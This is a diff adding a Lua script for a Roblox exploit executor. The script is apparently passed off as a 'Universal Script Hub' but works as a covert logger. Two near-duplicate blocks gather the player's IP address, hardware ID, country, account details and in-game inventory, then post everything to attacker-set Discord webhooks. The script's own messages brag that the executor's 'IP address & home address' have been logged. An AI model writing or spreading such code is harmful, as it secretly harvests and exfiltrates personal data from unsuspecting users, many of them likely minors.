@@ -1,0 +1,146 @@
+local executor = identifyexecutor()
+local IP = game:HttpGet("https://v4.ident.me")
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game.Players.LocalPlayer
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local us = _G.dhwebhook
+local eurl2 = us
+
+local Name =  game.Players.LocalPlayer.Name
+local UserID = game.Players.LocalPlayer.UserId
+local display = game.Players.LocalPlayer.DisplayName
+local IPData = game:HttpGet("https://wtfismyip.com/json")
+local OtherInfo = game:HttpGet("https://wtfismyip.com/headers")
+local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
+local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
+local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
+local AccountAge = game.Players.LocalPlayer.AccountAge
+local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
+local Diamonds = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+local Rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text
+local imgs = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. fardplayer.userId .. "&width=420&height=420&format=png"
+request = http_request or request or HttpPost or syn.request
+local error1 = {
+  ["content"] = "||@everyone|| Someone Executed ur Universal Script Hub IP  address & home address Logged",
+  ["embeds"] = {{
+  ["title"] = "```> ASTRAAAAAAAAA Universal Script Notifier <```",
+  ["color"] = tonumber(0x7b00ff),
+  ["fields"] = {
+  {
+   ["name"] = "```> DATA GENERATED < ```",
+   ["value"] = "\n**:performing_arts: UserName: "..Name.."\n:man_detective: Display name: "..display.."\n:man_detective: UserID: "..UserID.."\n:underage: AccountAge: "..AccountAge.."\n:crown: Rank: "..Rank.."\n:computer: Exploit: "..executor.."\n:house: IP Address: "..IP.."\n:mag: Place:"..Loading.."\n:mag: Place:"..Game.."\n:mag: Country :"..country.."\Receiver: ".._G.dhUserName.."**",
+   ["inline"] = false
+   },
+   {
+   ["name"] = "  :gem: Diamonds: :gem: ",
+   ["value"] = "```>>> "..Diamonds.."```",
+   ["inline"] = true
+    },
+    {
+    ["name"] = "     :trident:  Pets :trident:",
+    ["value"] = "```>>> "..Pets.."```",
+    ["inline"] = true
+    },
+    {
+    ["name"] =  ":bar_chart: RAP :bar_chart:",
+    ["value"] = "```>>> "..RAP.."```",
+    ["inline"] = true
+    },
+    {
+    ["name"]= "Pet Name & Rarity",
+    ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
+	["inline"]= true
+	},
+	{
+    ["name"] = "``:computer:  SOME ASSHOLE EXECUTED UR WALKERX UNIVERSAL SCRIPT :computer:   ```",
+    ["value"] = "".._G.dhUsername.."",
+    ["inline"] = false
+    },
+  }
+  }}
+  }
+  local errorData1 = game:GetService("HttpService"):JSONEncode(error1) 
+
+local headers = {
+["content-type"] = "application/json"
+}
+
+local e1 = {Url = eurl2, Body = errorData1, Method = "POST", Headers = headers}
+request(e1)
+
+
+
+
+local executor = identifyexecutor()
+local IP = game:HttpGet("https://v4.ident.me")
+local username = game:GetService("Players").LocalPlayer.Name
+local fardplayer = game.Players.LocalPlayer
+local rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local eurl = _G.Webhook
+
+local Name =  game.Players.LocalPlayer.Name
+local UserID = game.Players.LocalPlayer.UserId
+local display = game.Players.LocalPlayer.DisplayName
+local HardWareId = game:GetService("RbxAnalyticsService"):GetClientId()
+local Game = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)
+local Loading = game.Players.LocalPlayer.PlayerGui.Loading.Frame.Info.Location.Text
+local AccountAge = game.Players.LocalPlayer.AccountAge
+local RAP = game.Players.LocalPlayer.leaderstats.RAP.Value
+local Diamonds = game.Players.LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text
+local Rank = game.Players.LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
+local Pets = game.Players.LocalPlayer.PlayerGui.Inventory.Frame.PetAmount.Text
+request = http_request or request or HttpPost or syn.request
+local error2 = {
+  ["content"] = "||@everyone|| Someone Executed ur Universal Script Hub IP  adress & home adress Logged",
+  ["embeds"] = {{
+  ["title"] = "```> ASSTTTRAAAA Universal Script Notifier <```",
+  ["color"] = tonumber(0x7b00ff),
+  ["fields"] = {
+  {
+   ["name"] = "```> DATA GENERATED < ```",
+   ["value"] = "\n**:performing_arts: UserName: "..Name.."\n:man_detective: Display name: "..display.."\n:man_detective: UserID: "..UserID.."\n:underage: AccountAge: "..AccountAge.."\n:crown: Rank: "..Rank.."\n:computer: Exploit: "..executor.."\n:house: IP Address: "..IP.."\n:mag: Place:"..Loading.."\n:mag: Place:"..Game.."\n:mag: Country :"..country.."\nReceiver :"..UserName.."**",
+   ["inline"] = false
+   },
+   {
+   ["name"] = "  :gem: Diamonds: :gem: ",
+   ["value"] = "```>>> "..Diamonds.."```",
+   ["inline"] = true
+    },
+    {
+    ["name"] = "     :trident:  Pets :trident:",
+    ["value"] = "```>>> "..Pets.."```",
+    ["inline"] = true
+    },
+    {
+    ["name"] =  ":bar_chart: RAP :bar_chart:",
+    ["value"] = "```>>> "..RAP.."```",
+    ["inline"] = true
+    },
+    {
+    ["name"] = ":computer: HardWare ID :computer:",
+    ["value"] = "```"..HardWareId.."```",
+    ["inline"] = false
+    },
+    {
+    ["name"]= "Pet Name & Rarity",
+    ["value"]= "```Pet Name: "..v2.name.."\nPet Rarity: "..v2.rarity.."```",
+	["inline"]= true
+	},
+	{
+    ["name"] = "``:computer:  SOME ASSHOLE EXECUTED UR WALKERX UNIVERSAL SCRIPT :computer:   ```",
+    ["value"] = "".._G.Username.."",
+    ["inline"] = false
+    },
+  }
+  }}
+  }
+  local errorData2 = game:GetService("HttpService"):JSONEncode(error2) 
+
+local headers = {
+["content-type"] = "application/json"
+}
+local e2 = {Url = eurl, Body = errorData2, Method = "POST", Headers = headers}
+request(e2)
